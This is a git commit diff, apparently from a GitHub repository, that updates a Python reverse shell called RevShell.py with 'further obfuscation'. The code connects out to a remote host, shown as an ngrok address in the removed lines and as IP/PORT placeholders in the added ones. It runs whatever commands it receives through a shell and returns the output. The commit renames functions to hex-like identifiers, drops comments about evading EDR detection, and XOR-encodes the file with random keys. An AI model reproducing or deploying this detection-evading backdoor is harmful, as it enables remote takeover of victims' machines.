d9397ff7274a1c8e57601f1bfe9650a4d41ee0d2
Yoni Haziza <97190263+d4rkiZ@users.noreply.github.com>
2023-04-10 01:53:53 +0300

    Update RevShell.py
    further obfuscation

--- RevShell.py
+++ RevShell.py
@@ -1,46 +1,38 @@
-import os
-import base64
-import subprocess
-import socket
+import os, base64, subprocess, socket, random, string
 
-def prompt():
-    _0x2dc = os.getcwd()
-    _0x2db = socket.gethostname()
-    _0x2da = os.getlogin()
-    return f"\n{_0x2da}@{_0x2db}:{_0x2dc}$ "
+def _0x2d6():
+    _0x2d5 = os.getcwd()
+    _0x2d4 = socket.gethostname()
+    _0x2d3 = os.getlogin()
+    return f"\n{_0x2d3}@{_0x2d4}:{_0x2d5}$ "
 
-def connect():
+def _0x2d2():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('0.tcp.eu.ngrok.io', 17117))
+    s.connect(('IP', PORT))
     while True:
         try:
-            s.send(prompt().encode())
+            s.send(_0x2d6().encode())
             cmd = s.recv(1024).decode().rstrip()
             if not cmd:
                 continue
             CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             stdout, stderr = CMD.communicate()
-            # Send the output to the attacker in clear text
             s.send(stdout)
             s.send(stderr)
         except Exception as e:
-            # Send the error message to the attacker in clear text
             s.send(str(e).encode())
 
-def encode():
-    # Use an obfuscated file name to evade EDR detection
+def _0x2d0():
     filename = ''.join([chr(ord(c) + 3) for c in 'RevShell.py'])
     with open(filename, 'r') as f:
-        _0x2d3 = f.readlines()
-    encoded_lines = []
-    for _0x2d2 in _0x2d3:
-        # Obfuscate the code of the file by XORing it with a key
-        xor_key = 10
-        encoded_line = ''.join([chr(ord(c) ^ xor_key) for c in _0x2d2])
-        encoded_lines.append(encoded_line)
-    encoded_file = ''.join(encoded_lines)
-    # Encode the obfuscated file with base64 and return the result
-    encoded_result = base64.b64encode(encoded_file.encode('utf-8')).decode('utf-8')
+        _0x2cf = f.readlines()
+    _0x2ce = []
+    for _0x2cd in _0x2cf:
+        xor_key = random.randint(1, 255)
+        encoded_line = ''.join([chr(ord(c) ^ xor_key) for c in _0x2cd])
+        _0x2ce.append(encoded_line)
+    _0x2cc = ''.join(_0x2ce)
+    encoded_result = base64.b64encode(_0x2cc.encode('utf-8')).decode('utf-8')
     return encoded_result
 
-connect()
+_0x2d2()
